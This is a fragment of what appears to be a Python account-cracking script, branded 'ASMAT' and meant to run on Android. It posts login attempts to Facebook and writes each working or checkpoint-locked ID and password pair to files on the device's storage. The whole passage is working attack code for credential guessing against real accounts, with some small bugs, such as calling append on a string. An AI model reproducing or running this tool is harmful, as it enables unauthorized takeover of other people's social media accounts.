                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        
                                        print('\r\r\033[1;32m [ASMAT-OK] '+ids+' √ '+pas+'\033[1;97m')
                                        open('/sdcard/ASMAT/ASMAT-OK.txt','a').write(ids+' √ '+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;36m[ASMAT-2F] '+ids+' ~ '+pas)
                                                twf.append(ids)
                                                break                                                                                                                     
                        elif 'www.facebook.com' in po['error_msg']:                            
                                        if 'y' in pcp:
                                                print('\r\r\033[1;37m [ASMAT-CP] '+ids+' • '+pas+'\033[1;97m')
                                                open('/sdcard/ASMAT/ASMAT-CP.txt','a').write(ids+'•'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ASMAT/ASMAT-CP.txt','a').write(ids+' • '+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass


try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n \033[1;32m[×] \033[1;37mNo Internet Connection...!')
        exit()
                
menu()
